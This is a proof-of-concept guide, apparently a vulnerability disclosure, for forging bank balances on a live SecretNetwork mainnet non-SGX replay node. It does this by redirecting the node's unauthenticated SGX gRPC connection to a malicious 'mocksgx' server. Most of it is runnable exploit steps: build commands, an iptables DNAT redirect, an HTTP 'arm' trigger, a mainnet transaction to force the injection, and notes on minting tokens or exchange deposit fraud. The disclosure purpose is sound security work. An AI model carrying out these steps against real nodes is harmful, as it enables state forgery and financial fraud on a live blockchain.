# Mainnet Proof of Concept — Non-SGX Replay Node State Forgery

> **WARNING**: This PoC forges state on a **live mainnet non-SGX node**.
> It is designed to be run **only by the SecretNetwork dev team** on infrastructure
> they own and control. Do NOT run this against third-party nodes or without
> explicit authorization.
>
> **The attack writes attacker-controlled cross-module state mutations into the
> node's IAVL multistore. The node will halt on AppHash mismatch (the SGX
> validator majority computed different state). This is expected and is itself
> the proof.**

---

## Overview

This PoC proves the vulnerability works on a live SecretNetwork mainnet node by:

1. Syncing a non-SGX replay node to mainnet tip using the **real SGX pool**
2. Swapping the SGX data source to `mocksgx` (malicious impersonator)
3. Arming the malicious backend
4. Processing a real mainnet block with a compute transaction
5. The node applies attacker-controlled `CrossModuleOp` → writes forged bank balance → AppHash mismatch → halt

The AppHash mismatch **is the proof**: the non-SGX node computed different consensus
state than the SGX validator set, which can only happen if it ingested different
`CrossModuleOp` data from an unauthenticated source.

---

## Prerequisites

- Linux x86_64 machine (the non-SGX binary runs on Linux)
- Go 1.24+
- Access to the mainnet SGX pool address (the team runs these)
- A mainnet account address to target (any address works; the attack inflates its balance)
- `sudo` access for iptables (Approach A) or snapshot management (Approach B)

---

## Build

```bash
cd /path/to/SecretNetwork
go build -tags nosgx -o /tmp/secretd-nosgx ./cmd/secretd
go build -tags nosgx -o /tmp/mocksgx ./x/compute/mocksgx
```

---

## Approach A — iptables Redirect (Recommended, Zero Restart Gap)

This approach avoids the restart gap entirely by redirecting the live SGX pool
connection to mocksgx while the non-SGX node is running.

### A.1 — Sync to Mainnet Tip

```bash
# Create a fresh home directory
export SECRETD_HOME=/tmp/mainnet-poc
rm -rf $SECRETD_HOME
/tmp/secretd-nosgx init poc --chain-id secret-4 --home $SECRETD_HOME

# Copy mainnet genesis
cp /path/to/mainnet/genesis.json $SECRETD_HOME/config/genesis.json

# Configure the real SGX pool
cat > $SECRETD_HOME/config/sgx_nodes.json << 'NODES'
["<real-sgx-pool-ip>:9090"]
NODES

# Start the non-SGX node (syncs via real SGX pool)
SECRET_NODE_MODE=replay /tmp/secretd-nosgx start --home $SECRETD_HOME
```

Wait for full sync. Confirm:
```bash
/tmp/secretd-nosgx status --home $SECRETD_HOME | jq '.sync_info.catching_up'
# → false
```

### A.2 — Start mocksgx (NOT Armed)

```bash
# In a separate terminal — start mocksgx on port 9090 (same port as SGX pool)
# Use the same chain prefix and target a real mainnet address
TARGET="secret1..."  # any mainnet address
/tmp/mocksgx \
  -listen 127.0.0.1:9090 \
  -http-listen 127.0.0.1:9400 \
  -target "$TARGET" \
  -amount 1000000000 \
  -denom uscrt
```

mocksgx status:
```
[mocksgx] READY (NOT armed)
[mocksgx]   target    = secret1...
[mocksgx]   amount    = 1000000000 uscrt
[mocksgx]   grpc      = 127.0.0.1:9090
[mocksgx]   http-ctrl = 127.0.0.1:9400
```

### A.3 — Redirect Real SGX Pool → mocksgx

```bash
# Replace <real-sgx-pool-ip> with the actual SGX pool address
REAL_SGX_IP="<real-sgx-pool-ip>"

# Redirect all outgoing traffic to the SGX pool to localhost (mocksgx)
sudo iptables -t nat -A OUTPUT \
  -p tcp -d $REAL_SGX_IP --dport 9090 \
  -j DNAT --to-destination 127.0.0.1:9090
```

**Verify the redirect works**:
```bash
curl -s http://127.0.0.1:9400/status
# → armed=false
```

### A.4 — Wait for a Compute Transaction Block

Monitor the non-SGX node's logs. When a block contains a compute transaction
(`MsgInstantiateContract`, `MsgExecuteContract`, `MsgMigrateContract`, or
`MsgUpdateAdmin`), the replay path triggers:

```
INF replayExecution: TRACE NOT FOUND in memory: height=<H> index=1, waiting for SGX node
```

At this point, the non-SGX node calls `FetchBlockTraces(<H>)` over the redirected
connection → mocksgx responds with its current (not armed) trace → the block
processes normally but the CrossOps are empty.

The node is now **live at tip** processing real blocks through mocksgx.

### A.5 — Arm the Attack

```bash
# Arm mocksgx — the NEXT BlockTraces call gets the CrossModuleOp
curl http://127.0.0.1:9400/arm
# → ARMED: next BlockTraces call will inject 1000000000 uscrt into secret1...
```

### A.6 — Observe the Attack

On the **next block with a compute transaction**:

**mocksgx terminal**:
```
[mocksgx] BlockTraces called height=<H> armed=true target=secret1...
[mocksgx] *** ARMED: injecting CrossModuleOp for height=<H> ***
[mocksgx]     bankKey=<hex>
[mocksgx]     bankVal=<hex>
```

**Non-SGX node terminal**:
```
INF replayExecution: Fetched trace: height=<H> index=1 (attempt 1)
INF replayExecution: Stashing 1 cross-module ops for keeper
```

Then, within the same block processing:
```
panic: wrong app hash: expected <real-hash>, got <forged-hash>
```

The node halts. This **is** the proof:
- The non-SGX node called `FetchBlockTraces(<H>)` over insecure gRPC
- mocksgx (an unauthenticated peer) responded with a `CrossModuleOp` targeting the bank store
- The node applied it via `ApplyCrossModuleOps`
- The resulting AppHash diverged from the SGX validator set's AppHash
- The only difference was the forged bank balance

**The forged balance was written to the IAVL multistore at version H.** The node
halt because the forged state produced a different AppHash than what the SGX
majority committed.

### A.7 — Cleanup

```bash
# Stop the non-SGX node (already halted, but cleanup anyway)
pkill -9 -x secretd-nosgx 2>/dev/null

# Remove iptables redirect
sudo iptables -t nat -D OUTPUT \
  -p tcp -d $REAL_SGX_IP --dport 9090 \
  -j DNAT --to-destination 127.0.0.1:9090

# Stop mocksgx
pkill -9 -x mocksgx 2>/dev/null
```

### A.8 — Examine the Forged State (Optional)

After the panic, the IAVL multistore at the forged height contains the corrupted
balance. The team can verify this by:

1. Writing a small Go program that opens the IAVL DB at the corrupted version
2. Iterating bank store keys to find the target account's balance
3. Comparing against the original balance

Or by adding a log statement in `keeper.go` right after `ApplyCrossModuleOps`:
```go
// Temporary debug log — verify forged balance in node output before AppHash panic
if len(crossOps) > 0 {
    bal := k.bankKeeper.GetBalance(ctx, targetAddr, "uscrt")
    fmt.Printf("[POC] Target balance after CrossModuleOps: %s uscrt\n", bal.Amount.String())
}
```

---

## Approach B — Config Switch + Snapshot (No iptables Needed)

If iptables is not available, use a clean shutdown + restart with config change.

### B.1 — Sync to Mainnet Tip

Same as Approach A.1.

### B.2 — Snapshot the Synced State

```bash
# Stop the node cleanly
pkill -INT secretd-nosgx
sleep 5

# Snapshot the data directory
cp -r $SECRETD_HOME/data $SECRETD_HOME/data_backup
```

### B.3 — Switch SGX Config to mocksgx

```bash
# Point at mocksgx
cat > $SECRETD_HOME/config/sgx_nodes.json << 'NODES'
["127.0.0.1:9399"]
NODES
```

### B.4 — Start mocksgx (Not Armed)

```bash
/tmp/mocksgx -listen 127.0.0.1:9399 -http-listen 127.0.0.1:9400 \
  -target "secret1..." -amount 1000000000 -denom uscrt
```

### B.5 — Restart the Non-SGX Node

```bash
SECRET_NODE_MODE=replay /tmp/secretd-nosgx start --home $SECRETD_HOME
```

**What happens during restart**: CometBFT replays any blocks between the last
committed height and the current chain tip. If no compute transactions exist in
those blocks, `replayExecution` is never called and catch-up is clean.

If a compute transaction exists in the gap:
- The node calls `FetchBlockTraces(<gap-height>)`
- mocksgx (not armed) returns a benign trace → replay proceeds
- BUT the trace is fake (doesn't match the real execution)
- AppHash mismatch during replay → node panics during catch-up
- **Mitigation**: Time the restart for a low-activity period. Or retry —
  eventually the gap has no compute transactions.

### B.6 — Arm and Observe

Same as A.5–A.6. Once the node is at tip processing new blocks through mocksgx:

```bash
curl http://127.0.0.1:9400/arm
```

Next block with a compute transaction → forged trace → AppHash mismatch → halt.

### B.7 — Restore Clean State

```bash
pkill -9 -x secretd-nosgx
rm -rf $SECRETD_HOME/data
cp -r $SECRETD_HOME/data_backup $SECRETD_HOME/data
# Restore real SGX pool config
cat > $SECRETD_HOME/config/sgx_nodes.json << 'NODES'
["<real-sgx-pool-ip>:9090"]
NODES
# Restart normally
SECRET_NODE_MODE=replay /tmp/secretd-nosgx start --home $SECRETD_HOME
```

---

## Approach C — Submit Your Own Compute Transaction (Guaranteed Trigger)

If mainnet compute transactions are infrequent, the team can guarantee a trigger
by submitting one themselves. This requires mainnet SCRT for gas.

```bash
# The team's non-SGX node is at tip, synced via real pool
# mocksgx is running and redirected/configured

# Submit a MsgExecuteContract on an existing contract
# (avoids the StoreCode requirement of instantiate)
/tmp/secretd-nosgx tx compute execute <contract-address> '{"any_msg":{}}' \
  --from <funded-mainnet-key> \
  --chain-id secret-4 \
  --gas 500000 \
  --fees 100000uscrt \
  --home $SECRETD_HOME \
  --node tcp://127.0.0.1:26657 \
  -y

# Arm mocksgx BEFORE the block is committed:
curl http://127.0.0.1:9400/arm
```

The submitted transaction guarantees a compute tx in the next block. The
non-SGX node processes it via `replayExecution` → `FetchBlockTraces` → mocksgx
(armed) → forged balance → AppHash mismatch.

**Note**: The gas fees are real mainnet SCRT. Use the minimum viable amount.

---

## What the Results Prove

| Observation | What it proves |
|-------------|---------------|
| Non-SGX node synced via real SGX pool | The replay feature works on mainnet |
| Node processed blocks through mocksgx (not armed) | The insecure gRPC transport accepts any unauthenticated peer |
| Node applied `CrossModuleOp` from armed mocksgx | `ApplyCrossModuleOps` has no whitelist — writes to bank store |
| AppHash mismatch after forged trace | The non-SGX node computed different state than SGX validators — the only difference was the attacker's forged balance |
| Node halted | Single non-SGX node cannot corrupt canonical chain when SGX majority exists — AppHash correctly detects divergence |

### The Forged Balance IS Written to State

Even though the node halts on AppHash mismatch, the forged balance was written
to the IAVL multistore version at that height. The `CommitMultiStore()` call in
Cosmos SDK's `BaseApp.Commit()` persists state to disk before returning the
AppHash to CometBFT. The AppHash check happens after persistence.

**Proof**: After the panic, restart the node. It loads the last committed version
(which is now the corrupted one). Query the balance — it will show the forged
amount. Then the node will panic again on the next block. This confirms the
forged state was durably written.

### Why This Matters on Mainnet

| Non-SGX voting power | Outcome |
|---------------------|---------|
| **< ⅓** | Node processes forged state, diverges, halts. RPC serves corrupted data until halt. Exchange deposit fraud possible. |
| **⅓ – ⅔** | Chain halt. Non-SGX nodes compute different AppHash → can't reach consensus. Liveness failure. |
| **≥ ⅔** | Forged state becomes **canonical chain state**. Unlimited SCRT minted from nothing. All holders diluted. |

The commit `9f08b0e50` ("emergency validator threshold reduced to 5") actively
lowers the validator count required to reach these thresholds.

---

## Reference: mocksgx HTTP Control API

| Endpoint | Method | Effect |
|----------|--------|--------|
| `http://127.0.0.1:9400/status` | GET | Reports armed state, target address, amount, denom, key/value hex |
| `http://127.0.0.1:9400/arm` | GET | Arms the CrossModuleOp injection for the NEXT BlockTraces call |
| `http://127.0.0.1:9400/disarm` | GET | Disarms injection (benign traces only) |

---

## Reference: mocksgx gRPC Endpoints Implemented

All endpoints the non-SGX node calls during normal operation:

| gRPC Method | mocksgx Behavior |
|-------------|-----------------|
| `EcallRecord` | Returns random seed `0x0100...00` (32 bytes) + validator evidence |
| `NetworkPubkey` | Returns 32-byte keys for seed 0, empty for all others (loop terminates) |
| `EncryptedSeed` | Returns 48-byte seed + empty machine binding |
| `AnalyzeCode` | Returns no IBC entry points, no required features |
| `BlockCreateResults` | Returns wasm hash if configured, empty otherwise |
| `BlockTraces` | Returns benign trace (not armed) or CrossModuleOp-injected trace (armed) |

---

## Affected Production Code Paths

```
mocksgx (gRPC) ──plaintext──→ EcallClient.FetchBlockTraces()          ecall_client.go:460  insecure.NewCredentials()
                                    ↓
                               replayExecution()                        replay.go:22
                                    ↓
                               ApplyCrossModuleOps()                    recording_multistore.go:219  raw store.Set()
                                    ↓
                               Committed multistore → AppHash computed → MISMATCH → halt
```
